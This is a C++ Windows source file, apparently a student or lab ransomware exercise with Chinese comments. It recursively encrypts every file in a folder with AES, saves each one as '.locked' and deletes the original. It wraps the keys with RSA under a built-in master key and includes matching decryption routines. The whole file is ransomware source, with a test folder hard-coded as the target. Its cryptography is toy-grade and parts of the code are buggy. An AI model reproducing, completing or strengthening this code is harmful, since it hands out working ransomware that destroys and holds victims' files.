#include "aes_file.h"
#include "aes.h"
#include "rsa.h"
#include <string>
#include <iostream>
#include <fstream>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <io.h>

using namespace std;

void random(unsigned char* key)
{
	unsigned int a;

	srand((unsigned)time(NULL));
	for (int i = 0; i <= 15; i++)
	{
		a = rand() % 255;
		//printf("%x ", a);
		key[i] = a;
		//printf("%x ", key[i]);
	}
}
void EncryptAllFiles(string path) {
	//文件句柄
	long hFile = 0;
	//文件信息
	struct _finddata_t fileinfo;
	string p;
	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1) {
		do {
			if ((fileinfo.attrib & _A_SUBDIR)) { //比较文件类型是否是文件夹
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0) {
					//files.push_back(p.assign(path).append("\\").append(fileinfo.name));

					EncryptAllFiles(p.assign(path).append("\\").append(fileinfo.name));//递归搜索
				}
			}
			else {
				//files.push_back(p.assign(path).append("\\").append(fileinfo.name));
				printf("\t文件名：\t%30s\n", fileinfo.name);//在控制台打印本目录下的文件名
				//随机生成密钥
				unsigned char key[16];
				random(key);
				//
				const char* name = p.assign(path).append("\\").append(fileinfo.name).data();
				aes(key, p.assign(path).append("\\").append(fileinfo.name));
				remove(name);//删除源文件
			}

		} while (_findnext(hFile, &fileinfo) == 0); //寻找下一个，成功返回0，否则-1
		_findclose(hFile);
	}
}
void DecryptAllFiles(string path, string fileType = ".locked")
{
	long hFile = 0;
	long hFile1 = 0;// 文件句柄
	// 文件信息
	struct _finddata_t fileinfo;

	string p;

	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1) {
		do
		{
			if ((fileinfo.attrib & _A_SUBDIR)) { //比较文件类型是否是文件夹
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
				{
					//files.push_back(p.assign(path).append("\\").append(fileinfo.name));

					DecryptAllFiles(p.assign(path).append("\\").append(fileinfo.name));//递归搜索
				}
			}
			else if ((hFile1 = _findfirst(p.assign(path).append("\\*" + fileType).c_str(), &fileinfo)) != -1)
			{
				do
				{
					//files.push_back(p.assign(path).append("\\").append(fileinfo.name));
					printf("\t文件名：\t%30s\n", fileinfo.name);
					//
					//
					const char* name = p.assign(path).append("\\").append(fileinfo.name).data();
					string c = p.assign(path).append("\\").append(fileinfo.name);
					int n = c.find(".locked");
					c.erase(n);
					deaes(session_pri_key, p.assign(path).append("\\").append(fileinfo.name), c);
					remove(name);//删除源文件
				} while (_findnext(hFile1, &fileinfo) == 0); //寻找下一个，成功返回0，否则-1
				_findclose(hFile1);
			}
		} while (_findnext(hFile, &fileinfo) == 0); //寻找下一个，成功返回0，否则-1

		_findclose(hFile);
	}



}
void get_session_key(pub_key* session_pub_key, pri_key* session_pri_key)//随机生成私钥、公钥
{
	long long q = getprime();
	long long p = getprime();
	while (q == p)
	{
		q = getprime();
	}//随机生成两个16bit质数p和q
	//cout << "p=" << p << endl; cout << "q=" << q << endl;
	long long n = p * q;//公开n
	//cout << "n=" << n << endl;
	long long w = (p - 1) * (q - 1);
	long long pk;
	bool flag;
	flag = true;
	while (flag)
	{
		srand((unsigned)time(NULL));
		pk = rand() % (w - 1) + 1;
		if (gcd(pk, w) == 1)
			flag = false;
	}//求得公钥
	//cout << "公钥(pk,n):(" << pk << "," << n << ")" << endl;
	long long sk = multiplicative_inverse_element(pk, w);//求得私钥
	//cout << "私钥(sk,n):(" << sk << "," << n << ")" << endl;
	session_pri_key->pri_key = sk;
	session_pub_key->pub_key = pk;
	session_pri_key->n = n;
	session_pub_key->n = n;

}
void rsa(unsigned char* aes_key, pub_key session_pub_key, unsigned char* encrypted_aes_key)
{
	unsigned int a[16];
	unsigned int b[16];
	//unsigned char aes_key[] = "1qaz2wsx3edc4rfv";
	for (int i = 0; i < 16; i++) {
		a[i] = (unsigned int)aes_key[i];
		//printf("%x ", a[i]);
		b[i] = square_multiplication(a[i], session_pub_key.pub_key, session_pub_key.n);
		//printf("%x ", b[i]);
		encrypted_aes_key[4 * i] = (unsigned char)(b[i] >> 24);
		//printf("%x ", c[4*i]);
		encrypted_aes_key[4 * i + 1] = (unsigned char)(b[i] >> 16);
		//printf("%x ", encrypted_aes_key[4 * i+1]);
		encrypted_aes_key[4 * i + 2] = (unsigned char)(b[i] >> 8);
		encrypted_aes_key[4 * i + 3] = (unsigned char)b[i];
	}

}
void dersa(unsigned char* encrypted_aes_key, pri_key session_pri_key, unsigned char* aes_key)
{
	unsigned int a[16];
	for (int i = 0; i < 16; i++) {
		a[i] = ((unsigned int)encrypted_aes_key[4 * i] << 24) + ((unsigned int)encrypted_aes_key[4 * i + 1] << 16)
			+ ((unsigned int)encrypted_aes_key[4 * i + 2] << 8) + (unsigned int)encrypted_aes_key[4 * i + 3];
		//printf("%x ", (unsigned int)encrypted_aes_key[i] << 24);
		aes_key[i] = (unsigned char)square_multiplication(a[i], session_pri_key.pri_key, session_pri_key.n);
	}
}
void aes(unsigned char* aes_key, string file_name)
{
	unsigned char expansionkey[15 * 16];
	ScheduleKey(aes_key, expansionkey, 4, 10);
	ifstream read;
	read.open(file_name, ios::in | ios::binary);
	if (!read)
	{
		cout << "read error" << endl << endl;
	}
	ofstream write;
	write.open(file_name+".locked", ios::out | ios::binary);
	if (!write)
	{
		cout << "write error" << endl << endl;
	}
	unsigned char temp[16];
	unsigned char* cache = new unsigned char;
	//int flag;
	int i;
	unsigned char* encrypted_aes_key = new unsigned char[64];
	rsa(aes_key, session_pub_key, encrypted_aes_key);
	for (int k = 0; k <= 63; k++)
	{
		*cache = encrypted_aes_key[k];//****************************************************************************
		//printf("%02x ", key[k]);
		write.write((char*)cache, sizeof(unsigned char));
	}
	while (read.peek() != EOF) {
		for (i = 0; i <= 15; i++)
		{
			if (read.peek() != EOF)
			{
				read.read((char*)cache, sizeof(unsigned char));
				temp[i] = *cache;
				//printf("%02x ", temp[i]);
			}
			else
			{
				for (int j = i; j <= 15; j++)
				{
					temp[j] = '\0';
				}
				break;
			}
		}
		//flag = i;
		AesEncrypt(temp, expansionkey, 10);
		for (int k = 0; k <= 15; k++)
		{
			*cache = temp[k];
			//printf("%02x ", temp[k]);
			write.write((char*)cache, sizeof(unsigned char));
		}
	}
}
void deaes(pri_key session_pri_key, string file_name, string decrypt_file_name)
{
	unsigned char expansionkey[15 * 16];
	ifstream read;
	read.open(file_name, ios::in | ios::binary);
	if (!read)
	{
		cout << "read error" << endl << endl;
	}
	ofstream write;
	write.open(decrypt_file_name, ios::out | ios::binary);
	if (!write)
	{
		cout << "write error" << endl << endl;
	}
	unsigned char temp[16];
	unsigned char* cache = new unsigned char;
	unsigned char* decripted_aes_key = new unsigned char[16];
	unsigned char* encrypted_aes_key = new unsigned char[64];

	for (int i = 0; i <= 63; i++)
	{
		read.read((char*)cache, sizeof(unsigned char));
		encrypted_aes_key[i] = *cache;
	}
	dersa(encrypted_aes_key, session_pri_key, decripted_aes_key);
	ScheduleKey(decripted_aes_key, expansionkey, 4, 10);


	while (read.peek() != EOF) {
		for (int i = 0; i <= 15; i++)
		{
			read.read((char*)cache, sizeof(unsigned char));
		    temp[i] = *cache;
		}
		Contrary_AesEncrypt(temp, expansionkey, 10);
		for (int k = 0; k <= 15; k++)
		{
			*cache = temp[k];
			write.write((char*)cache, sizeof(unsigned char));
		}
	}
}
void rsa_rsa(pri_key *session_pri_key, pub_key master_pub_key)
{
	session_pri_key->pri_key = square_multiplication(session_pri_key->pri_key, master_pub_key.pub_key, master_pub_key.n);
	session_pri_key->n = square_multiplication(session_pri_key->n, master_pub_key.pub_key, master_pub_key.n);
}

void dersa_rsa(long long n,long long key)
{
	session_pri_key.pri_key = square_multiplication(key, master_pri_key.pri_key, master_pri_key.n);
	session_pri_key.n = square_multiplication(n, master_pri_key.pri_key, master_pri_key.n);
}

void func1(void)
{
    get_session_key(&session_pub_key,&session_pri_key);//随机生成rsa密钥对session_pub_key和session_pri_key
	rsa_rsa(&session_pri_key, master_pub_key);//用内置rsa公钥master_pub_key加密session_pri_key,加密后变为encrypted_sesson_pri_key，并把原来的session_pri_key删除。
	EncryptAllFiles("C:\\Users\\Administrator\\Desktop\\test");//加密所有文件******************千万不要改成C盘************************
}

long long return_n(void)
{
    return session_pri_key.n;

}

long long return_pri_key(void)
{
    return session_pri_key.pri_key;
}

void func2(long long key,long long n)
{
    dersa_rsa(key,n);
}

void func3(void)
{
    DecryptAllFiles("C:\\Users\\Administrator\\Desktop\\test");
}

/*

int main()
{
    func1();
    cout<<return_n()<<endl<<return_pri_key();
    func2(session_pri_key.pri_key,session_pri_key.n);
    func3();
}*/

